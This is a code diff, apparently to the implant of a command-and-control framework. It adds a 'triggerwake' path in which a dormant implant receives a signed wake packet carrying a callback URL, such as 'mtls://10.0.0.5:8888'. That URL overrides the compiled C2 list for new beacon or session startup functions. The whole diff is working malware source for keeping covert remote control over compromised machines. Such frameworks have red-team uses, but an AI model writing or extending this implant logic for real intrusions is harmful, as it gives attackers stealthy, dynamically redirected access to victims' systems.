@@ -145,22 +145,30 @@ func Main() {
 		// {{if .Config.Debug}}
 		log.Printf("[triggerwake] waiting for wake trigger before C2 startup...")
 		// {{end}}
-		transportHint := <-transports.WakeChannel()
+		wakeInfo := <-transports.WakeChannel()
 		// {{if .Config.Debug}}
-		log.Printf("[triggerwake] wake received (transport=%q), proceeding to C2 startup", transportHint)
+		log.Printf("[triggerwake] wake received (transport=%q callback=%q), proceeding to C2 startup", wakeInfo.TransportHint, wakeInfo.CallbackURL)
 		// {{end}}
 
 		// Apply transport preference from the wake packet.
-		transports.SetPreferredTransport(transportHint)
+		transports.SetPreferredTransport(wakeInfo.TransportHint)
 
 		// Reset connection errors so previous session failures don't
 		// prevent the new session from connecting.
 		connectionErrors = 0
 
 		// {{if .Config.IsBeacon}}
-		beaconStartup()
+		if wakeInfo.CallbackURL != "" {
+			beaconStartupWithCallback(wakeInfo.CallbackURL)
+		} else {
+			beaconStartup()
+		}
 		// {{else}} ------- IsBeacon/IsSession -------
-		sessionStartup()
+		if wakeInfo.CallbackURL != "" {
+			sessionStartupWithCallback(wakeInfo.CallbackURL)
+		} else {
+			sessionStartup()
+		}
 		// {{end}}
 
 		// Session/beacon returned -- clear the transport preference
@@ -230,6 +238,48 @@ func beaconStartup() {
 	}
 }
 
+// beaconStartupWithCallback is the dynamic-infrastructure variant of
+// beaconStartup. The callbackURL overrides the baked-in C2 list for
+// this beacon session attempt.
+func beaconStartupWithCallback(callbackURL string) {
+	// {{if .Config.Debug}}
+	log.Printf("Running in Beacon mode with ID: %s (dynamic callback: %s)", InstanceID, callbackURL)
+	// {{end}}
+	abort := make(chan struct{})
+	defer func() {
+		abort <- struct{}{}
+	}()
+	beacons := transports.StartBeaconLoop(abort, callbackURL)
+	for beacon := range beacons {
+		// {{if .Config.Debug}}
+		log.Printf("Next beacon = %v", beacon)
+		// {{end}}
+		if beacon != nil {
+			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] skipping stale beacon for %s, c2-uri is %s", beacon.ActiveC2, c2)
+				// {{end}}
+				continue
+			}
+			err := beaconMainLoop(beacon)
+			if err != nil {
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
+			}
+		}
+		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
+			continue
+		}
+		reconnect := transports.GetReconnectInterval()
+		// {{if .Config.Debug}}
+		log.Printf("Reconnect sleep: %s", reconnect)
+		// {{end}}
+		time.Sleep(reconnect)
+	}
+}
+
 // {{else}}
 
 func sessionStartup() {
@@ -241,6 +291,44 @@ func sessionStartup() {
 		abort <- struct{}{}
 	}()
 	connections := transports.StartConnectionLoop(abort)
+	for connection := range connections {
+		if connection != nil {
+			err := sessionMainLoop(connection)
+			if err != nil {
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
+				connectionErrors++
+				if transports.GetMaxConnectionErrors() < connectionErrors {
+					return
+				}
+			}
+		}
+		reconnect := transports.GetReconnectInterval()
+		// {{if .Config.Debug}}
+		log.Printf("Reconnect sleep: %s", reconnect)
+		// {{end}}
+		time.Sleep(reconnect)
+	}
+}
+
+// sessionStartupWithCallback is the dynamic-infrastructure variant of
+// sessionStartup. The callbackURL (e.g. "mtls://10.0.0.5:8888") was
+// delivered via the authenticated wake trigger packet and overrides the
+// baked-in C2 list for this session attempt. If the dynamic target is
+// unreachable, the implant falls back to the compiled C2 list via the
+// normal reconnect path (the trigger-implant loop in Main will return
+// to dormant state and wait for the next wake).
+func sessionStartupWithCallback(callbackURL string) {
+	// {{if .Config.Debug}}
+	log.Printf("Running in session mode (dynamic callback: %s)", callbackURL)
+	// {{end}}
+	abort := make(chan struct{})
+	defer func() {
+		abort <- struct{}{}
+	}()
+	connections := transports.StartConnectionLoop(abort, callbackURL)
 	for connection := range connections {
 		if connection != nil {
 			err := sessionMainLoop(connection)
@@ -348,7 +436,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-time.After(duration):
 		case <-shortCircuit:
 			// Short circuit current duration with no error
-		case <-transports.WakeChannel(): // value (transport hint) intentionally discarded for beacons
+		case <-transports.WakeChannel(): // WakeInfo intentionally discarded for beacons
 			// Out-of-band wake (e.g., triggerwake transport received a
 			// signed UDP wake task). Same effect as shortCircuit:
 			// stop sleeping, proceed to next check-in.
